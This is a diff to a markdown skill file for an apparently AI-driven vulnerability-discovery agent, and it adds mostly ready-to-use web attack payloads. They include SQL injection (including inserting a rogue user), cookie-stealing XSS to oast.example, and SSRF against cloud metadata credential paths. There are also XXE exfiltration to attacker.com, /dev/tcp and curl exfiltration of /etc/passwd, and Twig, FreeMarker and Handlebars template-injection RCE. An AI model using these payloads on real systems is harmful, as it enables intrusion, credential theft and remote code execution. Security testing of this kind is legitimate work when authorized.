@@ -1,9 +1,10 @@
-﻿---
+---
 name: vuln-discovery
 description: "Systematic identification and verification of security weaknesses in target applications"
 category: core
 tier: balanced
 toolRefs: [httpRequest, parseResponse, checkWaf, findEndpointsInResponse, evaluateRendered, compareResponses, measureTiming, followRedirects, updateGraph, writeFinding, recordEvidence, getCapturedHeaders, runPrimitive, sqlmap]
+primitives: [classicInjection, nosqlInjection]
 triggers: ["find vulnerabilities", "security testing", "vulnerability scanning", "weakness identification", "security assessment", "bug hunting", "vuln detection", "security flaws", "test for vulnerabilities", "security issues"]
 contextBoosts: [sqli]
 mitreAttack: ["T1190", "T1195"]
@@ -69,46 +70,89 @@ For each injection point:
 ### SQL Injection (Database-Specific)
 
 **Generic Tautology:**
-- `' OR '1'='1`, `" OR "1"="1`, `' OR 1=1--`, `" OR ""="`
+
+```sql
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR ""="
+admin'--
+```
 
 **UNION-Based:**
-- `UNION SELECT null,null,null` (increment columns until match)
-- `UNION ALL SELECT null,null,null` (avoid deduplication)
-- `UNION SELECT 1,2,3--` (identify output columns)
+
+```sql
+UNION SELECT null,null,null
+UNION ALL SELECT null,null,null
+UNION SELECT 1,2,3--
+```
 
 **Blind Boolean:**
-- `' AND 1=1--`, `' AND 1=2--` (compare response length, content, status)
-- `' AND (SELECT LENGTH(password) FROM users LIMIT 1)=10--` (extract data bit by bit)
+
+```sql
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT LENGTH(password) FROM users LIMIT 1)=10--
+```
 
 **Blind Time-Based:**
-- `' AND SLEEP(5)--` (MySQL)
-- `'; WAITFOR DELAY '0:0:5'--` (MSSQL)
-- `'; SELECT PG_SLEEP(5)--` (PostgreSQL)
-- `' AND DBMS_LOCK.SLEEP(5)--` (Oracle)
-- Use **measureTiming** to detect delay vs baseline
+
+```sql
+' AND SLEEP(5)--                              -- MySQL
+'; WAITFOR DELAY '0:0:5'--                    -- MSSQL
+'; SELECT PG_SLEEP(5)--                       -- PostgreSQL
+' AND DBMS_LOCK.SLEEP(5)--                    -- Oracle (requires privileges)
+'||(SELECT pg_sleep(5))||'                    -- PostgreSQL string-context
+```
+
+Use **measureTiming** to detect delay vs baseline.
 
 **Error-Based (extract data from error messages):**
-- `' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--` (MySQL XML error)
-- `' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--` (MySQL)
-- `' AND 1=CONVERT(int,@@version)--` (MSSQL type conversion)
-- `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--` (Oracle)
-- `' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--` (MySQL schema enumeration)
+
+```sql
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
+' AND 1=CONVERT(int,@@version)--              -- MSSQL type conversion
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--   -- Oracle
+' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--
+```
 
 **Stacked Queries:**
-- `'; SELECT * FROM users--` (if multi-statement supported)
-- `'; INSERT INTO users VALUES('hacker','pass123')--` (if writes possible)
+
+```sql
+'; SELECT * FROM users--
+'; INSERT INTO users VALUES('hacker','pass123')--
+```
 
 **Database-Specific Enumeration:**
-- MySQL: `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--`
-- PostgreSQL: `' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--`
-- MSSQL: `' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--`
-- Oracle: `' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1--`
-- SQLite: `' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--`
+
+```sql
+-- MySQL
+' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+-- PostgreSQL
+' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--
+-- MSSQL
+' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
+-- Oracle
+' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1--
+-- SQLite
+' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
+```
 
 **Second-Order SQLi:**
 - Register with username: `' OR '1'='1'--`
 - Login with that account to trigger the query
 - Inject into profile fields that are used in later queries
+
+```http
+POST /register HTTP/1.1
+
+username=admin'--&password=x&email=x@test.local
+
+POST /login HTTP/1.1
+
+username=admin'--&password=x
+```
 
 ---
 
@@ -144,6 +188,12 @@ For each injection point:
 - Test with short payloads first, then longer variants
 - Check if output is encoded differently per rendering context
 
+```html
+<!-- stored probe → escalate after confirming render -->
+<img src=x onerror=alert(1)>
+<svg/onload=fetch('//oast.example/s?c='+document.cookie)>
+```
+
 **Filter Bypass XSS:**
 - Case variation: `<ScRiPt>`, `<IMG SRC=x>`
 - Null bytes: `<scr%00ipt>`
@@ -152,15 +202,26 @@ For each injection point:
 - Without parentheses: `<script>onerror=alert;throw 1</script>`
 - Using `location`: `<script>location='javascript:alert(1)'</script>`
 
+```html
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe src="javascript:alert(1)">
+<body onpageshow=alert(1)>
+"><script>alert(document.domain)</script>
+```
+
 ---
 
 ### SSRF (Server-Side Request Forgery)
 
 **Internal URL Probes:**
-- `http://127.0.0.1`, `http://localhost`, `http://[::1]`
-- `http://0.0.0.0`, `http://127.0.0.1:80`, `http://127.0.0.1:443`
-- `http://127.0.0.1:8080`, `http://127.0.0.1:6379` (Redis)
-- `http://169.254.169.254` (cloud metadata endpoint)
+
+```http
+GET /fetch?url=http://127.0.0.1 HTTP/1.1
+GET /fetch?url=http://localhost:8080 HTTP/1.1
+GET /fetch?url=http://[::1] HTTP/1.1
+GET /fetch?url=http://127.0.0.1:6379 HTTP/1.1
+```
 
 **Cloud Metadata Endpoints:**
 - AWS: `http://169.254.169.254/latest/meta-data/`
@@ -169,11 +230,17 @@ For each injection point:
 - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
 - DigitalOcean: `http://169.254.169.254/metadata/v1/`
 
+```http
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
+```
+
 **Protocol Smuggling:**
-- `file:///etc/passwd`, `file:///proc/self/environ`
-- `gopher://127.0.0.1:6379/_INFO` (Redis)
-- `gopher://127.0.0.1:11211/_stats` (Memcached)
-- `dict://127.0.0.1:6379/INFO` (Redis via dict)
+
+```http
+GET /fetch?url=file:///etc/passwd HTTP/1.1
+GET /fetch?url=gopher://127.0.0.1:6379/_INFO HTTP/1.1
+GET /fetch?url=dict://127.0.0.1:11211/stats HTTP/1.1
+```
 
 **IP Encoding Bypass:**
 - Decimal: `http://2130706433` (127.0.0.1)
@@ -235,20 +302,82 @@ For each injection point:
 - DNS exfiltration: `; nslookup $(whoami).YOUR_DOMAIN`
 - HTTP exfiltration: `; curl http://YOUR_SERVER/?data=$(whoami)`
 
+```bash
+# conditional timing proves execution without output
+; [ "$(whoami)" = "root" ] && sleep 5
+
+# OOB via /dev/tcp when no callback tool exists
+; cat /etc/passwd > /dev/tcp/YOUR_IP/4444
+```
+
 ---
 
 ### XXE (XML External Entity)
 
 **Classic XXE:**
 
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+```
+
 **Parameter Entity (inside DTD):**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
+  %eval;
+  %error;
+]>
+<foo>test</foo>
+```
+
+The `%error;` entity forces the file content into a file-open failure message — classic error-based exfiltration.
 
 **Blind XXE (OOB extraction):**
 Host `evil.dtd` on your server:
 
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
+%int;
+%send;
+```
+
+Then point the target at it:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>
+<foo>test</foo>
+```
+
 **XXE via SVG Upload:**
 
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <text x="0" y="20">&xxe;</text>
+</svg>
+```
+
 **XXE in SOAP:**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE soapenv [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Body>
+    <getUser><id>&xxe;</id></getUser>
+  </soapenv:Body>
+</soapenv:Envelope>
+```
 
 **XXE via Content-Type:**
 - Send XML body with `Content-Type: text/xml` or `application/xml`
@@ -263,6 +392,18 @@ Host `evil.dtd` on your server:
 - Use `expect://` for PHP with expect extension: `SYSTEM "expect://id"`
 
 **XXE to SSRF:**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<foo>&xxe;</foo>
+```
+
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]>
+```
 
 ---
 
@@ -298,10 +439,22 @@ Host `evil.dtd` on your server:
 - Use debug mode to find template paths
 - Test for sandbox escape via `_twig_template.prerender`
 
+```text
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['id']|map('system')}}
+```
+
 **FreeMarker RCE:**
 - `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` (if Execute allowed)
 - `<#assign classloader=object.class.protectionDomain.classLoader>
 <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>`
+
+```freemarker
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
+```
 
 **Handlebars RCE:**
 - `{{#with "s" as |stringlist|}}
@@ -321,6 +474,24 @@ Host `evil.dtd` on your server:
     {{/splitType}}
   {{/with}}
 {{/with}}`
+
+```handlebars
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |stringlist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each codelist}}{{#with this}}{{this}}{{/with}}{{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
 
 **SSTI Filter Bypass:**
 - Space replacement: `{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}`
@@ -401,3 +572,15 @@ Map the attack surface first, then prioritize high-impact sinks: auth/authorizat
 ## Verification & Impact
 
 CONFIRMED when a testable input produces reproducible, evidence-backed behavior: SQLi via error/data/timing; XSS via executed script in rendered context; XXE via file content in response; SSTI via `{{7*7}}`=49; NoSQL via differential with data; command injection via output or measured side effect. SUSPECTED when an anomaly appears but cannot be reproduced or lacks a captured exchange — log as candidate, not a finding. Document impact by what the flaw enables and its severity, always backing claims with `recordEvidence` request/response pairs and `writeFinding` entries.
+
+## Primitive Execution
+
+The attack classes above are executable through the primitive registry. Invoke each
+primitive by its id below using the run-primitive execution tool instead of re-firing
+payloads manually; confirmed results pass through the evidence gate and commit as
+findings with exploit proofs automatically.
+
+| Primitive id | Coverage |
+|---|---|
+| `classicInjection` | SQLi (error/boolean/time-based/UNION) |
+| `nosqlInjection` | NoSQL operator injection |
